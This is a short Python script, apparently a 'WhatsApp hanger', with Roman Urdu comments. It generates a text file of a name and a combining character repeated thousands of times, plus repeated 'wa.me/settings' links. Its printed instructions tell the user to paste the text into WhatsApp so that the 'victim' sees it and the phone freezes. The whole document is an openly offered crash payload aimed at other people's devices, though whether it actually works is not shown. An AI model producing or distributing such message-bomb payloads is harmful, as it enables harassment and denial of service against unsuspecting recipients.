import os

def love_crasher():
    print("="*40)
    print("   MEHDI BHAI WHATSAPP HANGER (Ilove_YouW)   ")
    print("="*40)
    
    # Design Name jo screen par nazar aayega
    design_name = "Ilove_YouW"
    
    # Crash Code (Is mein special characters aur design name ka loop hai)
    # Ye characters jab WhatsApp render karta hai toh processor jam ho jata hai
    crash_payload = (design_name + " ҉ ") * 5000 + "\n" + ("wa.me/settings " + design_name) * 2000
    
    # File banana
    file_name = "Ilove_YouW_Crasher.txt"
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(f"--- {design_name} ---\n")
        f.write(crash_payload)
    
    print(f"[+] Done! '{file_name}' ban gayi hai.")
    print(f"[!] Is file ka sara text copy karke WhatsApp par bhejein.")
    print(f"[!] Victim jaise hi isay parhay ga, usay har taraf {design_name} nazar aayega aur phone jam ho jayega.")

love_crasher()
